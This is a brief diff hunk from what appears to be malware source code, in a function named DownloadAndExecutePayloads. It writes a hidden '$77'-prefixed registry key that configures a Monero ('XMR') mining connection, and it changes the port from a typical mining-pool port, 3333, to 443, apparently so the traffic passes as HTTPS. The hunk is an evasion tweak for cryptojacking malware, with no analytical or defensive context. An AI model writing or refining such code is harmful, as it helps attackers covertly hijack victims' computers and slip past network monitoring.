@@ -417,7 +417,7 @@ void DownloadAndExecutePayloads() {
     HKEY hKey;
     if (RegCreateKeyA(HKEY_LOCAL_MACHINE, 
         "SOFTWARE\\$77config\\tcp_remote", &hKey) == ERROR_SUCCESS) {
-        DWORD port = 3333;
+        DWORD port = 443;
         RegSetValueExA(hKey, "XMR", 0, REG_DWORD, (BYTE*)&port, sizeof(port));
         RegCloseKey(hKey);
     }
